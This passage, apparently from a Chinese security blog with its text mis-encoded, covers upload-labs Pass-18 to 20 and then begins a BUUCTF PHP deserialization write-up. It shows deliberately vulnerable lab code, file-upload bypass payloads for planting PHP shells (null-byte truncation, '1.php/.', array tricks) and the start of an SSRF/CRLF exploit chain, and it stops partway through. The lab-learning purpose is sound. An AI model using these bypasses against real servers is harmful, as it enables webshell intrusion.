<p>myupload.phpä¸­ä¿å­˜æ–‡ä»¶çš„è·¯å¾„çš„ä»£ç æ˜¯å†™å¾—æœ‰ç‚¹é—®é¢˜çš„ï¼Œå¹¶ä¸ä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨uploadç›®å½•ä¸­ï¼ŒåŸå› æ˜¯ä¿å­˜è·¯å¾„çš„å­—ç¬¦ä¸²åœ¨æ‹¼æ¥æ—¶å°‘äº†ä¸ªæ–œæ /ï¼Œå› æ­¤å¯è‡ªè¡Œåœ¨myupload.phpçš„setDir()å‡½æ•°ä¸­å°†cls_upload_dirå˜é‡å¯¹åº”çš„è¯­å¥åŠ ä¸ªæ–œæ å³å¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;cls_upload_dir = $dir.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ä»£ç -v17">ä»£ç </h4>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>myupload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line">	</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v17">ç»•è¿‡æ–¹å¼</h4>
<p>å®¡è®¡ç»™å‡ºæ¥çš„ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸ªæ¡ä»¶ç«äº‰é—®é¢˜ï¼Œå³ç¨‹åºå…ˆä¸Šä¼ æ–‡ä»¶å†é‡å‘½åæ–‡ä»¶ï¼Œ ä½†å¦‚æœåªèƒ½ä¸Šä¼ å›¾åƒæ–‡ä»¶è€Œæ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿä¸èƒ½getshellï¼Œä½†æ˜¯åç¼€åè¿‡æ»¤çš„ç™½åå•ä¸­åŒ…å«äº†zipã€7zã€rarç­‰Apacheä¸èƒ½è§£æçš„åç¼€åï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰æ¡ä»¶+è§£ææ¼æ´ç»•è¿‡ã€‚</p>
<p>åˆ©ç”¨è¿‡ç¨‹å’ŒPass-17ä¸€æ ·ï¼Œåªæ˜¯è¿™æ¬¡ä¸Šä¼ çš„æ–‡ä»¶åç¼€æ˜¯<code>.php.7z</code>ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202164723.png" alt=""></p>
<h3 id="Pass-19-åˆ©ç”¨-ç»•è¿‡">Pass-19 åˆ©ç”¨\.ç»•è¿‡</h3>
<h4 id="ä»£ç -v18">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå…³äºpathinfoçš„è¯´æ˜å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202165613.png" alt=""></p>
<h4 id="ç»•è¿‡æ–¹å¼-v18">ç»•è¿‡æ–¹å¼</h4>
<p>æ–‡ä»¶åæ˜¯é€šè¿‡POSTæ–¹å¼ä¼ å…¥çš„ï¼Œç„¶åé€šè¿‡é»‘åå•è¿‡æ»¤æ–‡ä»¶åç¼€åï¼Œæœ€åç›´æ¥ç”¨æ–‡ä»¶åæ‹¼æ¥ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ä¸Šä¼ ä¸Šå»ã€‚è¿™å…³çš„ç»•è¿‡æ–¹æ³•å°±å¾ˆå¤šäº†ï¼š</p>
<ul>
<li>0x00æˆªæ–­</li>
<li>ç‚¹ç»•è¿‡</li>
<li><code>::$DATA</code>ç»•è¿‡</li>
<li>ç©ºæ ¼ç»•è¿‡</li>
<li>å¤§å°å†™ç»•è¿‡</li>
<li>Apacheè§£ææ¼æ´ç»•è¿‡</li>
</ul>
<p>è¿™äº›éƒ½æ˜¯ä¹‹å‰å…³å¡éƒ½ç”¨è¿‡çš„ç»•è¿‡æ–¹å¼ï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯è€ƒå¯Ÿåˆ«çš„çŸ¥è¯†ç‚¹ã€‚äºæ˜¯ç½‘ä¸Šæ‰¾æ‰¾åˆ«äººçš„ç­”æ¡ˆï¼Œå‘ç°è€ƒç‚¹æ˜¯:move_uploaded_fileä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>/.</code>ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ <code>save_path=1.php/.</code>ï¼Œè¿™æ ·file_extå€¼å°±ä¸ºç©ºï¼Œå°±èƒ½ç»•è¿‡é»‘åå•ï¼Œè€Œmove_uploaded_fileå‡½æ•°å¿½ç•¥æ–‡ä»¶æœ«å°¾çš„<code>/.</code>å¯ä»¥å®ç°ä¿å­˜æ–‡ä»¶ä¸º.phpã€‚</p>
<p>ç»•è¿‡æ–‡ä»¶ååç¼€ï¼š</p>
<ul>
<li>
<p>post: save_name = 1.php%00.jpg</p>
</li>
<li>
<p>post: save_name = 1.php/.ã€</p>
</li>
</ul>
<h3 id="Pass-20-æ•°ç»„-ç»•è¿‡">Pass-20 æ•°ç»„+\.ç»•è¿‡</h3>
<h4 id="ä»£ç -v19">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>reset()å‡½æ•°ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</li>
<li>end()å‡½æ•°ï¼šå°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼ˆå¦‚æœæˆåŠŸï¼‰ã€‚</li>
<li>explode()å‡½æ•°ï¼šæŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚</li>
</ul>
<h4 id="ç»•è¿‡æ–¹å¼-v19">ç»•è¿‡æ–¹å¼</h4>
<p>å…ˆç†æ¸…ä¸€ä¸‹å‡½æ•°åšäº†ä»€ä¹ˆæ“ä½œï¼š</p>
<p>å‡½æ•°æ‰§è¡Œæµç¨‹ï¼šæ–‡ä»¶åé€šè¿‡POSTæ–¹å¼æäº¤â€”&gt;MIMEç™½åå•æ ¡éªŒâ€”&gt;æ–‡ä»¶åç¼€ç™½åå•æ ¡éªŒâ€”&gt;è·å–æ–‡ä»¶åæ‹¼æ¥åˆ°ä¸Šä¼ çš„è·¯å¾„ã€‚å…·ä½“è€Œè¨€ï¼š</p>
<p>ä»¥POSTæ–¹å¼ä¸Šä¼ save_nameæ—¶ï¼Œç¨‹åºä¼šå°†è¯¥å‚æ•°ä½œä¸ºæ–‡ä»¶åï¼›æ¥ç€åˆ¤æ–­è¯¥æ–‡ä»¶åå‚æ•°save_nameæ˜¯å¦ä¸ºæ•°ç»„ï¼Œè‹¥ä¸æ˜¯åˆ™ç›´æ¥<code>.</code>æ¥åˆ‡åˆ†ä¸ºæ•°ç»„å½¢å¼ï¼›extå˜é‡æ˜¯è°ƒç”¨end()å‡½æ•°å–æ•°ç»„æœ€åçš„ä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œè‹¥æ–‡ä»¶åå‚æ•°save_nameä¸æ˜¯æ•°ç»„å½“ç„¶æ˜¯æ­£å¸¸çš„åç¼€åï¼Œä½†æ˜¯è‹¥æ–‡ä»¶åå‚æ•°save_nameæ˜¯æ•°ç»„åˆ™å–çš„å°±æ˜¯save_nameä¸­æœ€åä¸€ä¸ªå…ƒç´ å€¼ï¼›extå’Œç™½åå•åˆ¤æ–­è¿‡æ»¤åï¼Œé€šè¿‡reset()å‡½æ•°è·å–æ–‡ä»¶åï¼Œè‹¥æ–‡ä»¶åå‚æ•°save_nameä¸ä¸ºæ•°ç»„ã€æ­¤æ—¶å½“ç„¶å°±æ˜¯æ­£å¸¸çš„æ–‡ä»¶åï¼Œä½†è‹¥æ–‡ä»¶åå‚æ•°save_nameä¸ºæ•°ç»„ï¼Œåˆ™æ˜¯å–save_nameä¸­ç¬¬ä¸€ä¸ªå…ƒç´ å€¼ï¼›è€Œæœ€åä¸Šä¼ æ–‡ä»¶çš„åç¼€åæ˜¯ç›´æ¥æ‹¼æ¥è¯¥è¯­å¥çš„å€¼<code>$file[count($file) - 1]</code>å³å°†æœ€åä¸€ä¸ªå…ƒç´ å€¼ä½œä¸ºåç¼€åã€‚</p>
<p>åˆ†æåˆ°è¿™é‡Œï¼Œç»•è¿‡çš„å…³é”®æ€è·¯å°±æ˜¯ï¼š<code>end($file)</code>æ˜¯jpgã€pngã€gifï¼Œè€Œ<code>$file</code>æœ€åä¸€ä¸ªå…ƒç´ æ˜¯phpã€‚</p>
<p>è¿™é‡Œå¯ä»¥æ„é€ <code>save_name[0] = 1.php/,save_name[2] = jpg</code>ï¼Œè¿™æ ·çš„è¯end($file)ä¸ºjpgï¼Œè€Œ<code>$file[count($file) - 1]</code>ä¸º$file[1]ä¸ºç©ºã€‚æ‰€ä»¥æœ€ç»ˆ<code>file_name=1.php/.</code>ï¼Œåˆ°è¿™é‡Œå°±è·ŸPass-19ä¸€æ ·äº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202173551.png" alt=""></p>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“">æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“</h2>
<h3 id="æ¼æ´ç±»å‹åˆ†ç±»">æ¼æ´ç±»å‹åˆ†ç±»</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202173811.png" alt=""></p>
<h3 id="æ¼æ´ç±»å‹åˆ¤æ–­æ–¹å¼">æ¼æ´ç±»å‹åˆ¤æ–­æ–¹å¼</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202173854.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<p>é¡¹ç›®åœ°å€ï¼š <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<p><a href="mi1k7ea.com/2019/10/05/upload-labs-WriteUp/#0x14-Pass-20-%E6%95%B0%E7%BB%84-%E7%BB%95%E8%BF%87">Upload-labs WriteUp</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–</title>
    <url>/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–">BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–</h1>
<h2 id="LCTF2018-Bestphpâ€™s-revenge">LCTF2018 Bestphpâ€™s revenge</h2>
<blockquote>
<p>è¿™ç¯‡æ–‡ç« åˆ†æçš„å¾ˆåˆ°ä½ï¼š<a href="https://www.anquanke.com/post/id/164569#h2-5">https://www.anquanke.com/post/id/164569#h2-5</a></p>
</blockquote>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>sessionååºåˆ—åŒ–</li>
<li>Soapclient + ssrf</li>
<li>CRLF</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>flag.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start(); </span><br><span class="line">echo &#39;only localhost can get flag!&#39;; </span><br><span class="line">$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; </span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; </span><br><span class="line">	$_SESSION[&#39;flag&#39;] &#x3D; $flag; </span><br><span class="line">&#125; </span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆ©ç”¨ç¬¬4è¡Œå›è°ƒå‡½æ•°æ¥è°ƒç”¨<code>session_start()</code>ç”¨äºè¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilazeï¼›</li>
<li>æ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆä¸Šé¢çš„åºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ï¼Œå¹¶ä¸”æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­åˆ©ç”¨äº†CRLFæ¼æ´å†™å…¥äº†æˆ‘ä»¬è§„å®šçš„seesion_idï¼›</li>
<li>ç„¶åå†é€šè¿‡ç¬¬4è¡Œçš„å›è°ƒå‡½æ•°è°ƒç”¨<code>extract()</code>å‡½æ•°ç”¨äºå˜é‡è¦†ç›–ï¼Œè¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°<code>call_user_func</code>ï¼›</li>
